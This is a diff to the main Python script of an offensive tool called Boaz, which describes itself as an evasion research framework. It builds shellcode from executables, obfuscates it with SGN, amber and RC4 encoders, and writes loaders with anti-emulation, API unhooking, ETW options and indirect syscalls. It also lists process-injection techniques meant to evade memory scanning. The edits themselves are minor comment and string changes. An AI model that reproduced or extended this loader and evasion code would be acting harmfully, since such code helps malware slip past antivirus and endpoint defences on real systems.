@@ -1,5 +1,5 @@
-# Boaz evasion research tool main program
-# Author: thomas M
+# Boaz evasion research tool main script
+# Author: thomas XM
 # Date 2023
 #
 # This file is part of the Boaz tool
@@ -34,10 +34,10 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
     elif shellcode_type == 'rc4':
         cmd = ['wine', './PIC/rc4_x64.exe', input_exe, output_path + ".bin", '-r']
         if subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
-            # If rc4_x64.exe fails, try with rc4_x86.exe
+            # If rc4_x64.exe fails, try with rc4_x86.exe for 32-bit payloads
             cmd = ['wine', '/PIC/rc4_x86.exe', input_exe, output_path + ".bin", '-r']
     elif shellcode_type == 'amber':
-        a_number = random.randint(1, 30)  # Random number between 1 and 30
+        a_number = random.randint(1, 30)  
         # print(f"Encoding number: {a_number}")
         cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
     else:
@@ -51,7 +51,6 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
         random_count = random.randint(1, 100)  # Generate a random count between 1 and 100
         encoded_output_path = output_path + "1.bin"  # Specify the encoded output file path
         encode_cmd = ['./encoders/sgn', '-a', '64', '-i', output_path + ".bin", '-o', encoded_output_path]
-        ## TODO: SGN would render the shellcode unusable in some cases, so it is disabled for now
         # encode_cmd = ['./sgn', '-a', '64', '-v', '-c', str(random_count), '-i', output_path + ".bin", '-o', encoded_output_path]
         try:
             subprocess.run(encode_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -164,10 +163,6 @@ def insert_junk_api_calls(content, junk_api, main_func_pattern):
 
 # def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
 def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False):
-
-    # Modify loader_template_path if -dll flag is used
-    # if compile_as_dll:
-    #     loader_template_path = loader_template_path.replace('.c', '.dll.c')
 
     # Adjust loader_template_path for DLL
     if compile_as_dll:
@@ -698,7 +693,7 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
         cleanup_command = ['rm', '-rf', 'temp.exe']
         subprocess.run(cleanup_command, check=True)
         
-    ### TODO: debug:
+
     elif syswhisper_option == 2:
         # Compiling with MingW and NASM requires a two-step process
         # Find all .o files in the current directory
@@ -799,7 +794,7 @@ def main():
 
           
     """ + reset_color)
-    print(start_color_magenta + "Boaz mini-evasion is starting...\n" + reset_color)
+    print(start_color_magenta + "Boaz mini-evasion framework is starting...\n" + reset_color)
 
     time.sleep(0.5)  # Sleeps for 2 seconds
 
@@ -837,7 +832,7 @@ def main():
     31. MAC address injection
     32. Stealth new injection (Advanced)
     33. Indirect Syscall + Halo gate + Custom Call Stack
-    37. 
+    37. Stealth new loader (Advanced, evade memory scan)
     38. A novel PI with APC write method and phantom DLL overloading execution (CreateThread pointed to a memory address of UNMODIFIED DLL.)
     39. Custom Stack PI (remote) with threadless execution
     40. Custom Stack PI (remote) Threadless DLL Notification Execution
@@ -1082,4 +1077,6 @@ if __name__ == '__main__':
             #     .#@@@@@@@@&&&&&&%%%%%%%%%%%%%%%&%%&&&&/,.                       
             #       .,*#&@@@&&&&&&&&%%%%%%%%&&&&%(*...                            
             #             .,,**********,,...                                      
+                                                    
+                                                    
                                                     
